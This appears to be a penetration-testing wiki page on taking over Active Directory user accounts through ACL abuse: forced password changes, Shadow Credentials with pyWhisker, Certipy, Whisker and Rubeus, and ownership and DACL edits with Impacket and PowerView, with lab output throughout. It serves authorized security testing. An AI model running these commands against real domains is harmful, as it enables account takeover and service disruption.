---
title: Abuse ACL Access over User
description: Use access rights over a user to take over that user account.
categories: [Active Directory, Privilege Escalation]
tags: [Active Direcotory, Privilege Escalation, Lateral Movement, ACL Abuse, Shadow Credentials]
weight: 2
---

## Force Change Password
The most naive method is to simply change that user's password. With `ForceChangePassword` access, which is included with `GenericAll` access on a user, we should be able to change that user's password without knowing their current password.

{{% alert title="Note" %}}
Change an account's password is considered **destructive** to the environment due to the potential disruption it may cause. With the account's password changed, Users may not be able to log in. If the account is a service account, the service can become unavailable. During real-life engagements, only use this technique if written consent from the client is obtained.
{{% /alert %}}

### Linux Perspective
From the Linux perspective, we can use the `net` command that are part of the Samba toolkit or `bloodyAD` to achieve this.
```bash
# Password for attacking user will be prompted
net rpc password <target_user> -U <domain>/<username> -S <dc_ip>
```
```bash
bloodyAD --host <dc_ip> -d <domain> -u <username> -p <password> set password svc_sql <new_password>
```
```bash
nxc smb <dc_host> -u <username> -p <password> -M change-password -o USER=<target_user> NEWPASS=<new_password>
```
```bash
changepasswd.py <domain>/<username>:<password>@<dc_host> -altuser <target_user> -altpass <new_password>
```

### Windows Perspective
We may use PowerView's `Set-DomainUserPassword` function to force change the target's password.
```powershell
Import-Module .\PowerView.ps1
$NewPassword = ConvertTo-SecureString <new_password> -AsPlainText -Force
Set-DomainUserPassword -Identity <target_user> -AccountPassword $NewPassword
```

## Targeted Kerberoasting
We can leverage the ability to write the target user's `servicePrincipalName` property (`GenericAll` or `GenericWrite` access required) to create a fake SPN and Kerberoast it like a normal service account and recover the target user's password via offline cracking. However, our ability to recover the plaintext password depends on the user's password strength.

Check out the article on [Kerberoasting]({{< relref "/docs/active_directory/movement/kerberos/kerberoast/#targeted-kerberoasting">}}) for more details.

## Shadow Credentials
**Shadow Credentials** abuses the ability to write to the `msDS-KeyCredentialLink` attribute of the target user. The attribute is normally used for Windows Hello for Business or other Passwordless authentication in the Active Directory environment.

{{% alert title="Note" %}}
Requirements for this technique are:
1. The domain must support PKINIT (Windows Server 2016+).
2. Domain controllers has its own key pair (such as in cases when the DC is also a certificate authority for AD CS).
3. We have control over an account who can edit the target account's `msDS-KeyCredentialLink` attribute (`GenericAll` or `GenericWrite`).
{{% /alert %}}

Attack procedure involves:
1. Attacker creates RSA public-private key pair.
2. Attacker creates an X509 certificate configured with the public key.
3. Attacker create a KeyCredential structure featuring the raw public key and add it to the `msDS-KeyCredentialLink` attribute.
4. Attacker authenticate using PKINIT with the certificate and the private key, and obtain the user's TGT.

### Linux Perspective
[pyWhisker](https://github.com/ShutdownRepo/pywhisker) may be used from a Linux attacker machine to create a key pair and add the public key to the `msDS-KeyCredentialLink` attribute of the target user. It then generate a #PKCS12 that contains the certificate and private key in the current working directory.
```bash
pywhisker -d <domain> -u <user> -p <password> --target <target_account> --action add [--use-ldaps]
```
```shell-session
╭─brian@rx-93-nu /tmp/tmp.kqftDIcpbI
╰─$ pywhisker -d gundam.local -u Hathaway.Noa -p Password1 --target svc_sql --action add --use-ldaps
[*] Searching for the target account
[*] Target user found: CN=SQL Service,CN=Users,DC=GUNDAM,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 6491aa50-785e-f839-daac-5a0b60173682
[*] Updating the msDS-KeyCredentialLink attribute of svc_sql
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: NiYn7UeE.pfx
[*] Must be used with password: 2fbXBUVaQokE1AygHoTH
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Next, we use **Pass-the-Certificate** to authenticate as the target user and obtain a TGT. This example uses the [PKINITtools](https://github.com/dirkjanm/PKINITtools) mentioned in the output of pyWhisker.
```bash
python3 gettgtpkinit.py -cert-pfx <cert_path> -pfx-pass <cert_pass> <domain>/<target_user> <ccache_filename>
```
```shell-session
╭─brian@rx-93-nu /tmp/tmp.kqftDIcpbI/PKINITtools
╰─$ python3 gettgtpkinit.py -cert-pfx ../NiYn7UeE.pfx -pfx-pass 2fbXBUVaQokE1AygHoTH GUNDAM.LOCAL/svc_sql svc_sql_tgt
2026-04-16 15:18:08,046 minikerberos INFO     Loading certificate and key from file
2026-04-16 15:18:08,065 minikerberos INFO     Requesting TGT
2026-04-16 15:18:08,077 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-04-16 15:18:08,077 minikerberos INFO     71cf34fb9f98f093e6e6a8e35c3bebcc99b5cf677608774771f451640b019ad7
2026-04-16 15:18:08,081 minikerberos INFO     Saved TGT to file
```
To clear the `msDS-KeyCredentialLink` after we are done, we can use the following command:
```bash
pywhisker -d <domain> -u <user> -p <password> --target <target_account> --action clear [--use-ldaps]
```

Certipy's `shadow auto` subcommand automatically authenticates via PKINIT and retreives a TGT and NTLM hash of the target user after adding the Shadow Credential. The NTLM hash is retreived via **UnPAC the hash**.
```bash
certipy shadow auto -u <username>@<domain> -p <password> -account <target_account> -target <dc_ip> -ns <dc_ip>
```
```shell-session
╭─brian@rx-93-nu /tmp/tmp.kqftDIcpbI
╰─$ certipy shadow auto -u hathaway.noa@gundam.local -p Password1 -account svc_sql -target 10.10.03 -ns 10.10.0.3
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'svc_sql'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3fb37ea398c84deb87fe0ea107c32395'
[*] Adding Key Credential with device ID '3fb37ea398c84deb87fe0ea107c32395' to the Key Credentials for 'svc_sql'
[*] Successfully added Key Credential with device ID '3fb37ea398c84deb87fe0ea107c32395' to the Key Credentials for 'svc_sql'
[*] Authenticating as 'svc_sql' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'svc_sql@gundam.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc_sql.ccache'
[*] Wrote credential cache to 'svc_sql.ccache'
[*] Trying to retrieve NT hash for 'svc_sql'
[*] Restoring the old Key Credentials for 'svc_sql'
[*] Successfully restored the old Key Credentials for 'svc_sql'
[*] NT hash for 'svc_sql': <NT_HASH>
```

### Windows Perspective
From a domain Windows machine, we may use [Whisker](https://github.com/eladshamir/Whisker) to add Shadow Credential to the target user.
```cmd
Whisker.exe add /target:<target_username> /domain:<domain_fqdn> /dc:<dc_host> /path:<cert_path> /password:<pfx_password>
```
```shell-session
PS C:\temp> .\Whisker.exe add /target:svc_sql /domain:gundam.local /path:svc_sql.pfx /password:cert_pass
[*] Searching for the target account
[*] Target user found: CN=SQL Service,CN=Users,DC=GUNDAM,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID d862b3c6-0ed7-4023-b1f6-8908f2dfdab2
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saving the associated certificate to file...
[*] The associated certificate was saved to svc_sql.pfx
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:svc_sql /certificate:svc_sql.pfx /password:"cert_pass" /domain:gundam.local /dc:RA-CAILUM.GUNDAM.local /getcredentials /show
```

Then, we may use [Rubeus](https://github.com/GhostPack/Rubeus) to request a TGT for the target object. Rubeus then print the TGT in base64 on console.
```cmd
.\Rubeus.exe asktgt /user:<user> /certificate:<cert_file> /password:<cert_pass> /domain:<domain_fqdn> /dc:<dc_host> /getcredentials /show
```
- If you get `KRB-ERROR (14) : KDC_ERR_ETYPE_NOTSUPP`, try setting `/enctype:aes128` or `/enctype:aes256`.

## Modify Ownership
If we are able to modify the owner object over a user account, we can change the owner to an object we control and give that object full control access, allowing us to use any of the three methods above to take control of the target user account.

### Linux Perspective
We use `owneredit.py` from Impacket to change the ownership of the user to an account we control.
```bash
owneredit.py -action write -owner <username> -target <target_user> <domain>/<user>:<password>
```
We then use `dacledit.py` from Impacket to give our user full control over the target user.
```bash
dacledit.py -action 'write' -rights 'FullControl' -principal <username> -target <target_user> <domain>/<username>:<password>
```

### Windows Perspective
The PowerView function `Set-DomainObjectOwner` may be used to change the ownership of a user object from a domain-joined Windows machine. It must be ran from a process under the context of the user who has the access to modify ownership information over the target user, or we can create a PSCredential object, alternatively.
```powershell
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $SecPassword)
Set-DomainObjectOwner -Credential $Cred -TargetIdentity '<target_user>' -OwnerIdentity '<username>'
```

We then use `Add-DomainObjectAcl` function from PowerView to give our user `GenericAll` access to the target user object.
```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity <target_user> -Rights All
```
